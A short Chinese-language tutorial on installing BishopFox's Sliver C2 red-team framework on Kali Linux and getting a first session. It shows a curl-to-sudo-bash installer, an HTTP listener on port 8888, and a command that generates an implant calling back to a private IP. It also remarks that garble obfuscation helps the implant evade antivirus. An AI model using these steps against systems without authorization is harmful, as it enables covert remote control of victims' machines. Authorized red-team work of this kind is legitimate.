# 关于Sliver C2

`Sliver` 是一个基于Go的开源、跨平台的红队平台，可供各种规模的组织用于执行安全测试。`Sliver` 的支持 `C2` `over Mutual-TLS`、`HTTP(S`) 和 `DNS`等协议。`implant`可以时时编译生成，并会使用证书进行加密。服务器和客户端以及`implant`都支持`MacOS`、`Windows` 和 `Linux`。如何在Kali Linux服务器上安装BishopFox的`Sliver C2`框架呢？

# 在kali中安装

**源码安装**

```
curl https://sliver.sh/install
|sudo bash
```

![](../Images/cf682e3eec962cdb27f2b484ec005e73.png)

可能由于网络等因素，下载比较慢。我们可以访问下面页面，直接下载编译好的。

> https://github.com/BishopFox/sliver/releases

下载Linux服务器端

![](../Images/9cae365490e772fdfcda241c91aa95c5.png)

**运行**

`sliver`运行需要配置一些环境变量，如`go`、`gcc`，方便生成木马时候进行编译，在`kali`下运行十分简单，因为kali已经内置了这些变量。只需执行命令`sliver-server_linux`即可。

![](../Images/e765762679be855ae9afab74d20c62cb.png)

# 快速上手

配置一个基于http的监听

```
http -l 8888

```

![](../Images/9e1d6cae2b608117c6d111af829f5750.png)

生成一个基于http的c2 shell

```
generate --http http://192.168.123.23
:8888
```

`sliver`之前的版本使用的`gobfuscate`，在源码层面修改变量以及代码结构，速度比较慢，相比之下`garble`是对中间编译环节进行混淆结构，速度比较快也能混淆大部分符号等信息。当然免杀效果也肯定很好。当然生成的文件也比较大约为`17M`

![](../Images/bc7ded87db781edbf692fe11c694324c.png)运行生成的exe文件，成功得到会话。

![](../Images/fb69c2005e7b32b9fc25e2d3589f8f1a.png)

![](../Images/9c02c7725630f8b37b3e2e358bd82044.png)

**进入当前会话**

```

use id
```
